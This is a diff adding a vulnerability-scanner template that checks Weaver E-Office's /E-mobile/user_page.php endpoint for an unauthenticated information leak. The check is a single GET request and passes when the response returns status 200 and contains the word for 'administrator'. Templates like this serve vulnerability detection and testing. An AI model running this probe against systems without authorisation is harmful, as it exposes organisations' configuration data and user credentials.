@@ -1,0 +1,23 @@
+id: weaver-e-office-info-leak
+info:
+  name: "泛微 E-Office user_page.php 接口敏感信息泄露"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    泛微 E-Office 系统中 user_page.php 接口因安全验证机制缺失，允许远程攻击者通过构造特定请求获取非授权敏感信息。
+      该漏洞可能导致系统配置详情、用户凭证等关键数据泄露，威胁企业内部信息资产安全。
+  tags: 泛微
+http:
+- raw:
+  - |
+    GET /E-mobile/user_page.php HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - '管理员'
